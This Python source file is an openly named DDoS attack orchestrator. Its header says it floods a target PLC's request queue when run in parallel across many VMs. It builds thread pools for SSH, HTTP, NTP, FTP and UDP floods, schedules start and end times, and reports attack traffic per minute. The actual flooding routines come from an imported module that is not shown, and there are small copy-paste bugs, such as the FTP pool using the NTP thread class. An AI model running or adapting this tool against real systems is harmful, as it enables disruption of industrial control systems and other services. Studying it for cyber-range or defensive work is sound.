#-----------------------------------------------------------------------------
# Name:        DDos attacker.py
#
# Purpose:     A simple PLC request sender program try to full fill the target PLC's 
#              request handling queue. This program need to be run on multiple machine
#              with multiple thread. for example run 100 this program parallel 
#              on 10 vms.
#
# Author:      Yuancheng Liu
#
# Created:     2023/10/02
# Version:     v_0.1
# Copyright:   
# License:     
#-----------------------------------------------------------------------------

import os
import sys
import time
from datetime import datetime
import json

print("Current working directory is : %s" % os.getcwd())
DIR_PATH = dirpath = os.path.dirname(__file__)
print("Current source code location : %s" % dirpath)

CONFIG_FILE_NAME = 'ddosAttackCfg.txt'

TOPDIR = 'src'
LIBDIR = 'lib'

TEST_ATK_TYPE = 'TEST'
SSH_ATK_TYPE = 'SSH'
HTTP_ATK_TYPE = 'URL'
NTP_ATK_TYPE = 'NTP'
FTP_ATK_TYPE = 'FTP'
TCP_ATK_TYPE = 'TCP'
UDP_ATK_TYPE = 'UDP'
MDBS_ATK_TYPE = 'MODBUS'

#-----------------------------------------------------------------------------
# find the lib directory
idx = dirpath.find(TOPDIR)
gTopDir = dirpath[:idx + len(TOPDIR)] if idx != -1 else dirpath   # found it - truncate right after TOPDIR
# Config the lib folder 
gLibDir = os.path.join(gTopDir, LIBDIR)
if os.path.exists(gLibDir):
    sys.path.insert(0, gLibDir)

# init the config loader
import ConfigLoader
gGonfigPath = os.path.join(dirpath, CONFIG_FILE_NAME)
iConfigLoader = ConfigLoader.ConfigLoader(gGonfigPath, mode='r')
if iConfigLoader is None:
    print("Error: The config file %s is not exist.Program exit!" %str(gGonfigPath))
    exit()
CONFIG_DICT = iConfigLoader.getJson()

# import the util function
import ddosAttackUtil

#-----------------------------------------------------------------------------
class testAttacker(object):

    def __init__(self) -> None:
        pass
    
    def stop():
        pass 

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class DDosAttacker(object):
    
    def __init__(self) -> None:
        self.threadPoolCount = int(CONFIG_DICT['ATK_TN']) if 'ATK_TN' in CONFIG_DICT.keys() else 20
        self.threadPool = []
        self.startT = int(CONFIG_DICT['ATK_ST']) if 'ATK_ST' in CONFIG_DICT.keys() else None
        self.endT = int(CONFIG_DICT['ATK_ET']) if 'ATK_ET' in CONFIG_DICT.keys() else None
        self.lastUpdateT = 0
        self.initThreadPool()

    #-----------------------------------------------------------------------------
    def _intiTestAtkPool(self):
        for idx in range(self.threadPoolCount):
            threadID = 'test-Atk-%s' %str(idx)
            attacker = testAttacker()
            attckThreadClient = ddosAttackUtil.attackThread(self, threadID, attacker)
            attckThreadClient.initAttacker(None)
            self.threadPool.append(attckThreadClient)
    
    def _initSSHAtkPool(self, sshAtkParm):
        print("Start init the SSH DDoS attack.")
        for idx in range(self.threadPoolCount):
            threadID = 'ssh-Atk-%s' %str(idx)
            attckThreadClient = ddosAttackUtil.attackThreadSSH(self, threadID, None)
            attckThreadClient.initAttacker(sshAtkParm)
            self.threadPool.append(attckThreadClient)

    def _initHTTPAtkPool(self, httpAtkParm):
        print("Start init the SSH DDoS attack.")
        for idx in range(self.threadPoolCount):
            threadID = 'http-Atk-%s' %str(idx)
            attckThreadClient = ddosAttackUtil.attackThreadHttp(self, threadID, None)
            attckThreadClient.initAttacker(httpAtkParm)
            self.threadPool.append(attckThreadClient)
    
    def _initNTPAtkPool(self, ntpAtkParm):
        print("Start init the NTP DDosAttacker")
        for idx in range(self.threadPoolCount):
            threadID = 'ntp-Atk-%s' %str(idx)
            attckThreadClient = ddosAttackUtil.attackThreadNtp(self, threadID, None)
            attckThreadClient.initAttacker(ntpAtkParm)
            self.threadPool.append(attckThreadClient)

    def _initFTPAtkPool(self, ftpAtkParm):
        print("Start init the FTP DDosAttacker")
        for idx in range(self.threadPoolCount):
            threadID = 'ftp-Atk-%s' %str(idx)
            attckThreadClient = ddosAttackUtil.attackThreadNtp(self, threadID, None)
            attckThreadClient.initAttacker(ftpAtkParm)
            self.threadPool.append(attckThreadClient)

    def _initUDPAtkPool(self, udpAtkParm):
        print("Start init the UDP DDosAttacker")
        for idx in range(self.threadPoolCount):
            threadID = 'udp-Atk-%s' %str(idx)
            attckThreadClient = ddosAttackUtil.attackThreadUDP(self, threadID, None)
            attckThreadClient.initAttacker(udpAtkParm)
            self.threadPool.append(attckThreadClient)


    #-----------------------------------------------------------------------------
    def initThreadPool(self):
        atkType =  CONFIG_DICT['ATK_TYPE']
        paramPath = os.path.join(DIR_PATH, CONFIG_DICT['ATK_JSON'])
        paramJson = None

        with open(paramPath) as fh:
            paramJson = json.load(fh)
        
        if atkType == TEST_ATK_TYPE:
            self._intiTestAtkPool()
        elif atkType == SSH_ATK_TYPE:
            self._initSSHAtkPool(paramJson[SSH_ATK_TYPE])
        elif atkType == HTTP_ATK_TYPE: 
            self._initHTTPAtkPool(paramJson[HTTP_ATK_TYPE])
        elif atkType == NTP_ATK_TYPE:
            self._initNTPAtkPool(paramJson[NTP_ATK_TYPE])
        elif atkType == FTP_ATK_TYPE:
            self._initFTPAtkPool(paramJson[FTP_ATK_TYPE])
        elif atkType ==  UDP_ATK_TYPE:
            self._initUDPAtkPool(paramJson[UDP_ATK_TYPE])

        # Start all the attack threads.
        for attckThreadClient in self.threadPool:
            attckThreadClient.start()
        print("All the attack theads ready.")

    #-----------------------------------------------------------------------------
    def run(self):
        # Start wait 
        nowT = self.lastUpdateT = int(datetime.now().strftime('%H%M%S'))
        if (not self.startT is None) and nowT <= self.startT:
            waitInv = self.startT - nowT
            print("- Wait %s min to start attack." %str(waitInv//60))
            time.sleep(waitInv)
        print("All thread start launch attack.")
        self.startAttack()
        while True:
            time.sleep(1)
            nowT = int(datetime.now().strftime('%H%M%S'))
            if self.endT and nowT >= self.endT:
                print("Stop attack.")
                self.stopAttack()
                break
            # calcuate the attack data flow count per min
            if nowT - self.lastUpdateT >= 60 : 
                count = self.getTotalAtkCount()
                print("DDoS Attack data flow [%s] : %s / min" %(str(nowT), str(count)))
                self.lastUpdateT = nowT

    #-----------------------------------------------------------------------------
    def getTotalAtkCount(self):
        count = 0 
        for client in self.threadPool:
            atkState = client.getAttackState()
            count += int(atkState[1])
        return count

    #-----------------------------------------------------------------------------
    def startAttack(self):
        for client in self.threadPool:
            client.setStartAtk(True)

    #-----------------------------------------------------------------------------
    def stopAttack(self):
        for client in self.threadPool:
            client.setStartAtk(False)

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
def main():
    ddosAttacker = DDosAttacker()
    ddosAttacker.run()

#-----------------------------------------------------------------------------
if __name__ == '__main__':
    main()


